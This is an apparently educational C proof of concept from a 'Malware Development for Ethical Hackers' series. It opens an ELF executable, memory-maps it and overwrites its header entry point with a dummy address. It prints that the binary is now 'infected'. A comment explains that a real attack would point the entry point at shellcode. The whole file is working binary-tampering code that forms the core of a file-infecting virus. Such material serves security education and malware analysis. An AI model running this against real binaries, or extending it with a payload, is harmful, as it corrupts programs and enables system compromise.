/*
 * Malware Development for Ethical Hackers
 * hack.c
 * simple ELF Entry Point Hijacker PoC
 * technique: Modifying e_entry in the ELF Header
 * author: @cocomelonc
 */
#include <stdio.h>
#include <elf.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

int main(int argc, char* argv[]) {
  if (argc < 2) {
    printf("usage: %s <target_elf>\n", argv[0]);
    return 1;
  }

  // open the target ELF file
  int fd = open(argv[1], O_RDWR);
  if (fd < 0) {
    perror("open");
    return 1;
  }

  // map the ELF file into memory for "surgery"
  // this allows us to treat the file like a byte array
  off_t size = lseek(fd, 0, SEEK_END);
  uint8_t* mem = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  // cast the start of memory to an ELF Header structure
  // we assume x86_64 architecture (Elf64_Ehdr)
  Elf64_Ehdr* header = (Elf64_Ehdr*)mem;

  // verify that the file is actually an ELF
  if (header->e_ident[EI_MAG0] != ELFMAG0 || header->e_ident[EI_MAG1] != ELFMAG1) {
    printf("target is not a valid ELF file.\n");
    munmap(mem, size);
    close(fd);
    return 1;
  }

  printf("original Entry Point: 0x%lx\n", header->e_entry);

  // hijack the Entry Point
  // in a real attack, you would point this to your shellcode's address.
  // here, we change it to a "dummy" address to prove we can modify it.
  header->e_entry = 0x13371337; 

  printf("hijacked Entry Point: 0x%lx\n", header->e_entry);

  // sync changes and cleanup
  msync(mem, size, MS_SYNC);
  munmap(mem, size);
  close(fd);

  printf("patching complete. The binary is now 'infected'.\n");

  return 0;
}